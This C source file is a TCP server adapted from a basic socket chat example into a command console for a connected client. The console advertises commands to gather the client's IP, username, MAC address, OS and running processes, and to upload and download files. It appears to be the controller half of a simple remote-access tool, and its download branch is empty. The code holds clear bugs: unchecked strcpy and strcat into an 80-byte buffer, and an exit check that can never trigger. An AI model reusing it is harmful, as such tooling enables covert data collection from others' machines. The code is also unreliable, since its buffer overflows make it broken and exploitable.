#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> // read(), write(), close()
#define MAX 80
#define PORT 8080
#define SA struct sockaddr
   
// Function designed for chat between client and server.
void func(int connfd)
{
    char buff[MAX];
    int n;
    // infinite loop for chat
    for (;;) {
        bzero(buff, MAX);
        printf("Command for client : ");
        n = 0;
        // copy server message in the buffer
        while ((buff[n++] = getchar()) != '\n')
            ;

        // send file to client
        if (strstr(buff, "upload")) {
            char* token = strtok(buff, " ");
            token = strtok(NULL, " ");
            char path[80];
            strcpy(path, token);
            path[strlen(path)-1] = '\0';
            FILE* file;
            if ((file = fopen(path, "r")) == NULL) {
                printf("File Not Found on Server!\n");
                exit(0);
            }
            fseek(file, 0, SEEK_END);
            long len = ftell(file);
            fseek(file, 0, SEEK_SET);
            char fileContents[len];
            fread(fileContents, 1, len, file);
            fclose(file);
            char n[2] = "\n\n";
            strcat(buff, n);
            strcat(buff, fileContents); // buff might be too small for files
        }
   
        // and send that buffer to client
        write(connfd, buff, sizeof(buff)); // buff might be too small for files
   
        // read the message from client and copy it in buffer
        read(connfd, buff, sizeof(buff));
        // get file contents to new file
        if (strstr(buff, "download")) {
            
        }

        // print buffer which contains the client contents
        printf("Client's response:\n %s", buff);
        bzero(buff, MAX);

        // if msg contains "Exit" then server exit and chat ended.
        if (strncmp("exit", buff, 4) == 0) {
            printf("Server Exit...\n");
            break;
        }
    }
}

// Driver function
int main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
   
    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
   
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");
   
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else
        printf("Server listening..\n");
    len = sizeof(cli);
   
    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &len);
    if (connfd < 0) {
        printf("server accept failed...\n");
        exit(0);
    }
    else
        printf("server accept the client...\n");
   
    printf("\nInformation to get from client:\n\tIPAddress : this will gather the client's IP Addess\n\t"
            "Username : this will gather the client's username\n\tMacAddress : this will gather the client's" 
            "MAC Address\n\tOS : this will gather the client's Operating System\n\tprocesses : this will"
            "list out the client's running processes\n\tupload <file path> : this will upload a file to the"
            "client\n\tdownload <file path> : this will download a file from the client\n\n");
    // Function for chatting between client and server
    func(connfd);
   
    // After chatting close the socket
    close(sockfd);
}